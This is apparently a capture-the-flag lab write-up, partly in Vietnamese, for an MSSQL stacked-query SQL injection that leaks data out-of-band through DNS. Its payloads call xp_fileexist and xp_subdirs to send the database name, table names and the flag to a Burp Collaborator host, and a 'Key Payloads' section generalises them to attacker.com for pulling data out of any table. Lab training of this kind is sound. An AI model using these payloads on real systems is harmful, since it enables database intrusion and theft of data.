# SQLi-037: MSSQL OOB DNS via xp_fileexist/xp_subdirs - Writeup

## Flag: `FLAG{mssql_xp_fileexist_oob}`

---

## 🔍 Bước 1: DETECT

```bash
# Response luôn giống nhau
curl "http://localhost:5037/report?id=1"
curl "http://localhost:5037/report?id=1'"

# Confirm stacked queries
time curl "http://localhost:5037/report?id=1;WAITFOR DELAY '0:0:3'--"
```

---

## 🎯 Bước 2: IDENTIFY

- MSSQL 2019
- Stacked queries supported
- xp_dirtree có thể bị restricted

---

## 🔧 Bước 3: ENUMERATE với xp_fileexist

### Test OOB

```sql
1;EXEC master..xp_fileexist '\\xxxxx.burpcollaborator.net\test\file.txt'--
```

### Extract database

```sql
1;DECLARE @d VARCHAR(100);SET @d=DB_NAME();EXEC('master..xp_fileexist "\\'+@d+'.xxxxx.burpcollaborator.net\a\b"')--
```

**DNS Lookup:** `reporting.xxxxx.burpcollaborator.net`

### Alternative: xp_subdirs

```sql
1;DECLARE @d VARCHAR(100);SET @d=DB_NAME();EXEC('master..xp_subdirs "\\'+@d+'.xxxxx.burpcollaborator.net\a"')--
```

---

## 📤 Bước 4: EXTRACT

### Enumerate tables

```sql
1;DECLARE @t VARCHAR(100);SET @t=(SELECT TOP 1 table_name FROM information_schema.tables);EXEC('master..xp_fileexist "\\'+@t+'.xxxxx.burpcollaborator.net\a\b"')--
```

**Tables found:** flags, reports, users

---

## 🏆 Bước 5-6: EXFILTRATE Flag

```sql
1;DECLARE @f VARCHAR(100);SET @f=(SELECT value FROM flags WHERE name='sqli_037');EXEC('master..xp_fileexist "\\'+@f+'.xxxxx.burpcollaborator.net\a\b"')--
```

**DNS Lookup:** `FLAG{mssql_xp_fileexist_oob}.xxxxx.burpcollaborator.net`

🎉 **FLAG:** `FLAG{mssql_xp_fileexist_oob}`

---

## 🔗 Key Payloads

```sql
-- xp_fileexist OOB
1;EXEC master..xp_fileexist '\\attacker.com\share\file'--

-- xp_subdirs OOB  
1;EXEC master..xp_subdirs '\\attacker.com\share'--

-- Data exfiltration
1;DECLARE @v VARCHAR(100);SET @v=(SELECT data FROM table);EXEC('master..xp_fileexist "\\'+@v+'.attacker.com\a\b"')--
```

---

## 📊 Summary

| Step | Action | Result |
|------|--------|--------|
| DETECT | Stacked queries test | Confirmed |
| IDENTIFY | MSSQL với alternative procedures | xp_fileexist available |
| ENUMERATE | OOB extraction | Found flags table |
| EXTRACT/EXFILTRATE | Get flag via DNS | FLAG{mssql_xp_fileexist_oob} |
